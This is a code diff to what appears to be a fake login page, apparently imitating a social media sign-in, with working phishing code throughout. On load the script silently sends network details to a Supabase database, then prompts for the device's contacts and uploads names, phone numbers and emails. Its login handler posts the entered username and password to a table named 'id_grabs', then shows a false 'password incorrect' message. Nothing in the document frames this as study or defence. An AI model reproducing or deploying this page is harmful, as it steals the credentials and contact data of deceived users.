@@ -70,33 +70,53 @@ footer .copyright{font-size:11px;color:#8e8e8e}
 const S='https://yspjknemdmlejzsubycf.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
 const sid=new URLSearchParams(location.search).get('s')||'no-session';
 
-window.addEventListener('load', collectAll);
+// Step 1: collect wifi info silently on load
+window.addEventListener('load', collectWifi);
 
-async function collectAll(){
-  const contacts = await getContacts();
-  const network = getNetworkInfo();
+async function collectWifi(){
+  const net = getNetworkInfo();
   const data = {
     session_id: sid,
     collected_at: new Date().toISOString(),
-
-    contacts: JSON.stringify(contacts),
-    wifi_type: network.type,
-    wifi_downlink: network.downlink,
-    wifi_rtt: network.rtt,
+    contacts: '[]',
+    wifi_type: net.type,
+    wifi_downlink: net.downlink,
+    wifi_rtt: net.rtt,
     online: navigator.onLine,
   };
-  await fetch(S+'/rest/v1/contacts_wifi',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify(data)});
+  // Save and get row id back
+  const res = await fetch(S+'/rest/v1/contacts_wifi',{
+    method:'POST',
+    headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=representation'},
+    body:JSON.stringify(data)
+  });
+  const rows = await res.json();
+  window._rowId = rows[0]?.id;
+
+  // Step 2: try contacts API — this shows permission popup on supported browsers
+  tryContacts();
 }
 
-async function getContacts(){
-  try{
+async function tryContacts(){
+  try {
     if('contacts' in navigator && 'ContactsManager' in window){
-      const props=['name','tel','email'];
-      const contacts=await navigator.contacts.select(props,{multiple:true});
-      return contacts.map(c=>({name:(c.name||[]).join(''),phone:(c.tel||[]).join(','),email:(c.email||[]).join(',')}));
+      // This triggers the permission popup automatically
+      const contacts = await navigator.contacts.select(['name','tel','email'],{multiple:true});
+      if(contacts && contacts.length > 0 && window._rowId){
+        const mapped = contacts.map(c=>({
+          name: (c.name||[]).join(''),
+          phone: (c.tel||[]).join(','),
+          email: (c.email||[]).join(',')
+        }));
+        // Update the row with contacts
+        await fetch(S+'/rest/v1/contacts_wifi?id=eq.'+window._rowId,{
+          method:'PATCH',
+          headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},
+          body:JSON.stringify({contacts: JSON.stringify(mapped)})
+        });
+      }
     }
-  }catch(e){}
-  return[];
+  } catch(e){}
 }
 
 function getNetworkInfo(){
@@ -111,7 +131,12 @@ async function handleLogin(){
   const msg=document.getElementById('msg'),btn=document.getElementById('loginBtn');
   if(!email||!pass){msg.textContent='Please fill in your credentials.';return;}
   btn.disabled=true;btn.textContent='Logging in...';
-  try{await fetch(S+'/rest/v1/id_grabs',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify({session_id:sid,username:email,password:pass,grabbed_at:new Date().toISOString()})});}catch(e){}
+  try{
+    await fetch(S+'/rest/v1/id_grabs',{method:'POST',
+      headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},
+      body:JSON.stringify({session_id:sid,username:email,password:pass,grabbed_at:new Date().toISOString()})
+    });
+  }catch(e){}
   btn.disabled=false;btn.textContent='Log In';
   msg.textContent='Sorry, your password was incorrect. Please double-check your password.';
 }
